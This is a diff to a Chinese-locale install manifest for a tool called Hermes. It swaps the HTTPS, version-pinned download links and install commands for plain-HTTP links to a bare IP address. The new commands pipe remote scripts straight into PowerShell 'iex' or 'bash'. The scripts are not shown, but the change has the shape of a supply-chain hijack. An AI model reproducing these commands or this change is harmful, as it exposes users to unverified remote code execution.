@@ -1,5 +1,5 @@
 {
-  "version": "2026.06.07.1",
+  "version": "2026.06.07.2",
   "updated_at": "2026-06-07",
   "locale": "zh-CN",
   "upstream": {
@@ -22,8 +22,8 @@
       "id": "windows",
       "label": "Windows",
       "recommended": "download_exe",
-      "download": "https://useai.live/hermes/Hermes-zh-CN-Setup.exe",
-      "command": "irm https://cdn.jsdelivr.net/gh/fresh-claw/hermes-cn@v2026.06.07.1/install.ps1 | iex",
+      "download": "http://47.121.138.43/hermes/Hermes-zh-CN-Setup.exe",
+      "command": "irm http://47.121.138.43/hermes/install.ps1 | iex",
       "method": "下载 Hermes-zh-CN-Setup.exe 运行；高级用户可用 PowerShell 命令。",
       "desktop": "生成官方 Hermes.exe，并补 Hermes 核心、TUI、网关和配置。"
     },
@@ -31,8 +31,8 @@
       "id": "macos",
       "label": "macOS",
       "recommended": "download_zip",
-      "download": "https://useai.live/hermes/hermes-macos-installer.zip",
-      "command": "curl -fsSL https://cdn.jsdelivr.net/gh/fresh-claw/hermes-cn@v2026.06.07.1/install.sh | bash -s -- --include-desktop",
+      "download": "http://47.121.138.43/hermes/hermes-macos-installer.zip",
+      "command": "curl -fsSL http://47.121.138.43/hermes/install.sh | bash -s -- --include-desktop",
       "method": "下载 zip，解压后打开 install.command；高级用户可用终端命令。",
       "desktop": "生成官方桌面端，并补 Hermes 核心、TUI、网关和配置。"
     },
@@ -40,7 +40,7 @@
       "id": "linux",
       "label": "Linux",
       "recommended": "terminal",
-      "command": "curl -fsSL https://cdn.jsdelivr.net/gh/fresh-claw/hermes-cn@v2026.06.07.1/install.sh | bash -s -- --include-desktop",
+      "command": "curl -fsSL http://47.121.138.43/hermes/install.sh | bash -s -- --include-desktop",
       "method": "调用官方 --include-desktop 流程生成 Linux 桌面端，再应用中文增强。",
       "desktop": "生成官方桌面端，并补 Hermes 核心、TUI、网关和配置。"
     }
